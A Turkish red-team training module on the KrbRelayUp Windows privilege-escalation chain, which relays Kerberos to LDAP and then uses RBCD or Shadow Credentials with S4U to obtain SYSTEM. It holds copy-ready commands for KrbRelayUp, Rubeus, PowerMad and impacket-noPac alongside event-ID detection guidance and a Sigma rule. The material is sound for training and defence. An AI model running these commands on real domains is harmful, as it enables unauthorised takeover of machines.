## 1. Kavramsal Temel — Neden Var?

Buraya kadarki relay teknikleri **domain** düzeyinde (bir DC'yi/host'u ele geçirme) çalıştı. **KrbRelayUp** ise farklı bir soruyu çözer: *Bir makinede zaten düşük yetkili bir kullanıcı olarak oturum açtım (foothold var), aynı makinede nasıl SYSTEM olurum?* Yanıt: makinenin **kendi kimlik doğrulamasını kendine relay etmek** — bir **local privilege escalation (LPE)** zinciri.

**Analoji:** Bir şirket binasındasın ve sıradan bir çalışan kimliğin var. KrbRelayUp, binanın *kendi güvenlik sistemini* kandırarak, senin kimliğini binanın "yönetici anahtar kartı" üreteci olan makineye tekrar sunar ve sana o makinenin master kartını (SYSTEM) verdirir. Dışarıdan kimse gelmez — bina kendi kendini soyar.

**Neden mümkün:** Bu, **NTLM relay'in Kerberos versiyonudur** (Rubeus/KrbRelay tarafından mümkün kılınan yerel Kerberos relay) + [RBCD](../Modul_06_Kerberos_Delegation_Saldirilari/06.3_Resource_Based_Constrained_Delegation.md) veya Shadow Credentials. Varsayılan `ms-DS-MachineAccountQuota = 10` sayesinde herhangi bir domain kullanıcısı yeni bir makine hesabı yaratabilir; bu hesap RBCD hedefi olarak makinenin kendisine yazılır ve S4U ile makinede SYSTEM elde edilir. Tek ön koşul: **LDAP signing/CB zorlanmamış** olması.

## 2. Teknik Derinlik — Yerel Kerberos Relay + RBCD Köprüsü

KrbRelayUp üç bileşeni zincirler: **(1)** yerel bir kimlik doğrulama koersiyonu (kendine auth), **(2)** bu auth'un LDAP'a relay'i, **(3)** RBCD/Shadow Cred yazımı + S4U ile SYSTEM ticket.

```
 DÜŞÜK YETKİLİ KULLANICI (foothold, MACHINE üzerinde)
        │
   (1) Yerel koersiyon: RPC/COM üzerinden MACHINE$ auth'unu tetikle (KrbRelay)
        │
        ▼
   (2) Bu auth'u LDAP://DC'ye relay et  (signing kapalıysa)
        │
        ▼
   (3a) RBCD: msDS-AllowedToActOnBehalfOfOtherIdentity = FAKE$ (MAQ ile yaratıldı)
   (3b) veya Shadow Cred: msDS-KeyCredentialLink = saldırgan anahtarı
        │
        ▼
   S4U2Self + S4U2Proxy ──▶ MACHINE üzerinde "Administrator" olarak servis ticket
        │
        ▼
   Rubeus ptt ──▶ SCM'e bağlan ──▶ SYSTEM servisi / komut  🏁 yerel SYSTEM
```

**RBCD yolu vs Shadow Credentials yolu:**
- **RBCD:** `MAQ ≥ 1` gerekir (yeni makine hesabı yarat). Domain'de `ms-DS-MachineAccountQuota=0` ise bu yol kapanır.
- **Shadow Credentials:** MAQ gerekmez; makine nesnesine `msDS-KeyCredentialLink` yazma yetkisi (relay ile elde edilir) + AD CS (PKINIT) gerekir → [Red 05.4](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/05.4_Shadow_Credentials.md). MAQ=0 ortamlarında tercih edilir.

**Neden yerel auth relay edilebilir:** Windows'ta bazı servisler (ör. RPC/DCOM üzerinden) makinenin kendi hesabıyla Kerberos/NTLM auth üretir. KrbRelay, `RPC over HTTP` / `RPCSS` gibi yüzeylerden bu auth'u yakalar. Savunma: **LDAP signing + Channel Binding** (relay'i kırar) ve **MAQ=0** (RBCD yolunu kapatır) → [Blue 8.1](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.1_LDAP_Signing_ve_Channel_Binding.md).

**Kerberos relay'in NTLM relay'den farkı (neden yeni):** Klasik NTLM relay, challenge-response'un hedefe bağlı olmamasından yararlanır. Kerberos'ta ise servis bileti (AP-REQ) belirli bir **SPN'e** şifrelenir — teoride relay edilemez, çünkü hedef SPN sabittir. James Forshaw'ın keşfi: yerel bir COM/RPC oracle'ı, saldırganın seçtiği **SPN için** (ör. `ldap/dc01`) AP-REQ üretmeye kandırılabilir. Böylece "kendi makinen adına, senin seçtiğin servise" geçerli bir Kerberos bileti üretilir ve o servise (LDAP) relay edilir. Bu, Kerberos'un "SPN bağlama" korumasını yerel oracle üzerinden aşar.

```
 KrbRelay (yerel COM oracle) ── AP-REQ for ldap/dc01 (MACHINE$ adına) ──▶ LDAP bind
        │                                                                     │
        └── SPN'i saldırgan seçti (oracle sayesinde) ──▶ RBCD/ShadowCred yaz ─┘
```

**Neden `CreateNewComputerAccount` gerekir:** RBCD'nin S4U2Proxy adımı, delege eden principal'ın (`FAKE01$`) bir **SPN'e sahip olması** ve parolasının bilinmesini gerektirir. Sıradan bir kullanıcı hesabı SPN taşımaz; bu yüzden MAQ ile **yeni bir makine hesabı** (otomatik SPN + kontrol edilen parola) yaratılır. MAQ=0 ise bu imkânsızlaşır → Shadow Credentials yoluna geçilir (SPN gerektirmez, PKINIT kullanır).

## 3. Pratik Uygulama — Çok Araçlı

**A) KrbRelayUp tek-komut (otomatik zincir):**
```powershell
# Tüm zinciri otomatikleştirir: relay → RBCD → S4U → SYSTEM
KrbRelayUp.exe relay -Domain corp.local -CreateNewComputerAccount FAKE01 -ComputerPassword Passw0rd!
KrbRelayUp.exe spawn -d corp.local -cn FAKE01 -cp Passw0rd! -i    # SYSTEM shell
```

**B) Manuel RBCD zinciri (Rubeus + PowerMad + KrbRelay):**
```powershell
# 1) MAQ ile sahte makine hesabı yarat
New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)
# 2) Yerel Kerberos relay ile LDAP'a bağlan, RBCD yaz (KrbRelay)
KrbRelay.exe -spn ldap/dc01.corp.local -rbcd <FAKE01-SID> -clsid <CLSID>
# 3) S4U ile MACHINE üzerinde Administrator ticket
Rubeus.exe s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:host/MACHINE /ptt
# 4) SYSTEM servisiyle komut
Rubeus.exe ptt /ticket:...   ;  sc.exe \\MACHINE ...
```

**C) Shadow Credentials yolu (MAQ=0 ise):**
```powershell
# Relay ile makineye KeyCredentialLink yaz → PKINIT → SYSTEM
KrbRelayUp.exe relay -Domain corp.local -shadowcred
```

**D) noPac varyantı (CVE-2021-42278/42287 — yamasız DC'de):**
```bash
# sAMAccountName spoofing ile makine hesabını DC adıyla çakıştır → DC$ TGS
impacket-noPac 'corp.local/lowuser:Pass' -dc-ip 10.0.0.10 -use-ldap \
   -shell --impersonate Administrator
```

**Örnek çıktı:**
```
[+] Created machine account 'FAKE01$' with password 'Passw0rd!'
[+] Relaying to LDAP...  RBCD attribute set on MACHINE01$
[+] Impersonating user 'Administrator' via S4U2Proxy
[+] Ticket injected. Spawning SYSTEM process...
NT AUTHORITY\SYSTEM
```

**Başarısızlık senaryoları (savunma çalışıyor):** LDAP signing+CB açıksa relay `STATUS_ACCESS_DENIED`; MAQ=0 ise `Access denied (create computer)`; noPac yaması varsa `KDC_ERR_S_PRINCIPAL_UNKNOWN`. Bu hataların her biri, karşı [Blue 8.1](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.1_LDAP_Signing_ve_Channel_Binding.md) önleminin doğru yapılandırıldığının kanıtıdır.

**Gerçek-dünya zinciri:**
```
düşük yetkili foothold ──▶ KrbRelayUp relay ──▶ RBCD/ShadowCred yaz ──▶ S4U ──▶ SYSTEM
        │                                                                        │
        ▼                                                                        ▼
   LSASS dump (Red 03.2) ──▶ domain kimlik bilgileri ──▶ yanal hareket (Red 04) ──▶ DA
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Kaynak İz (IOC) | Karşı Blue |
|---|---|---|---|
| KrbRelayUp (yerel LPE) | **T1068** (Exploitation for Priv Esc) | Yeni makine hesabı (4741); LDAP relay bağlantısı | [Blue 8.1](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.1_LDAP_Signing_ve_Channel_Binding.md) |
| RBCD yazımı | **T1098** | 5136 `msDS-AllowedToActOnBehalfOfOtherIdentity` | [Blue 5.x](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/) · [Blue 6.x](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/) |
| S4U2Self/Proxy | T1558.003 | 4769 servis ticket; olağandışı impersonation | [Blue 6.x](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/) |

**OPSEC notları:**
- **En net iz:** Kısa süre içinde **yeni makine hesabı yaratımı (4741)** + hemen ardından o hesabın RBCD/S4U kullanımı. Domain kullanıcılarının makine hesabı yaratması normalde nadirdir; Blue tarafı 4741'i düşük yetkili hesaplarla korelasyon avlar.
- **MAQ=0** kurumsal ortamlarda RBCD yolunu tamamen kapatır — saldırgan Shadow Cred'e kayar (bu da AD CS gerektirir). İkisi de kapalıysa KrbRelayUp çalışmaz.
- **Sahte makine hesabı temizliği:** Test sonrası yaratılan `FAKE01$` ve yazılan RBCD/KeyCred nitelikleri **geri alınmalı** (raporlama + iz temizliği); aksi halde kalıcı arka kapı ve tespit izi bırakır.
- Yerel relay, EDR'lerin izlediği COM/RPC yüzeylerini kullanır → modern EDR bunu davranışsal yakalayabilir.
- **CVE-2021-42287/42278 (sAMAccountName spoofing) ile ilişki:** MAQ ile yaratılan makine hesabının adını bir DC adıyla çakıştırıp (noPac) benzer bir yerel/domain yükseltme mümkündür; KrbRelayUp'ın alternatif bir varyantıdır. KB5008380/KB5008602 yamaları bunu kapatır — yamasız DC'lerde ek bir yükseltme yolu açar.
- **CVE-2022-26923 (Certifried) köprüsü:** AD CS varsa, yaratılan makine hesabının `dNSHostName`'i manipüle edilip DC$ sertifikası alınabilir → yerel SYSTEM yerine doğrudan domain yükseltme. KrbRelayUp'ın RBCD yolu kapalıysa (MAQ=0 değil ama signing açık) bu alternatif değerlendirilir → [Red 07.2](../Modul_07_AD_CS_PKI_Saldirilari/07.2_Certifried_CVE_2022_26923.md).
- **En sağlam savunma kombinasyonu:** LDAP signing+CB (relay'i kır) **VE** MAQ=0 (yeni makine hesabını engelle). Yalnız biri yetmez: MAQ=0 ama signing kapalıysa Shadow Cred yolu; signing açık ama MAQ=10 ise başka relay hedefi denenebilir.
- **Yerel LPE ≠ domain kompromizi:** KrbRelayUp yalnızca **o makinede** SYSTEM verir; domain'e sıçramak için sonraki adım ([LSASS hasadı](../Modul_03_Kimlik_Bilgisi_Erisimi/03.2_LSASS_Bellek_Dokumu.md) veya makine hesabıyla yanal hareket) gerekir. Yine de foothold'u güçlendiren kritik bir kaldıraçtır.

**Tespit mantığı (Blue bakışı):** Kısa zaman penceresinde tek bir düşük yetkili hesaptan: (1) 4741 makine hesabı oluşturma → (2) 5136 RBCD/KeyCredentialLink yazımı → (3) 4769 S4U servis bileti → (4) yerel SYSTEM süreci. Bu **dört olayın ardışıklığı** güçlü bir davranışsal imzadır; olgun SIEM bunu tek kurala bağlar. Ek olarak `ms-DS-MachineAccountQuota`'yı 0'a çekmek (delege yetkisi bir Tier-0 gruba verilerek) yeni makine hesabı oluşturmayı tamamen engeller ve bu kuralın ilk adımını (4741) hiç oluşturmaz.

## 5. Doğrulama / Lab

```powershell
# Lab: domain'e katılı iş istasyonu (LDAP signing OFF, MAQ=10), düşük yetkili kullanıcı
# 1) KrbRelayUp.exe relay -Domain corp.local -CreateNewComputerAccount FAKE01 -ComputerPassword Passw0rd!
# 2) KrbRelayUp.exe spawn ... -i  → whoami = SYSTEM doğrula
# Blue doğrulama (yeni makine hesabı + RBCD):
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4741}    # bilgisayar hesabı oluşturma
Get-WinEvent -FilterHashtable @{LogName='Security';Id=5136} |
  Where-Object { $_.Message -match 'AllowedToActOnBehalfOfOtherIdentity' }
```

**Sigma kuralı (KrbRelayUp ardışıklığı — 4 olay zinciri):**
```yaml
title: KrbRelayUp Local Privilege Escalation Chain
logsource: { product: windows, service: security }
detection:
  create_computer: { EventID: 4741 }                                  # yeni makine hesabı
  set_rbcd:
    EventID: 5136
    AttributeLDAPDisplayName: 'msDS-AllowedToActOnBehalfOfOtherIdentity'
  s4u: { EventID: 4769, TransmittedServices: '*' }                    # S4U servis bileti
  # aynı düşük yetkili aktör + <10 dk pencere
  condition: create_computer and set_rbcd and s4u
  timeframe: 10m
level: critical
```

**Savunma doğrulama (MAQ=0 saldırıyı kesmeli):**
```powershell
# MAQ=0 iken KrbRelayUp yeni makine hesabı yaratamaz → "Access denied" ile durur:
Get-ADObject "DC=corp,DC=local" -Properties ms-DS-MachineAccountQuota
# Değer 0 ise RBCD yolu kapalı; LDAP signing+CB de açıksa Shadow Cred yolu da kapanır → tam savunma
```
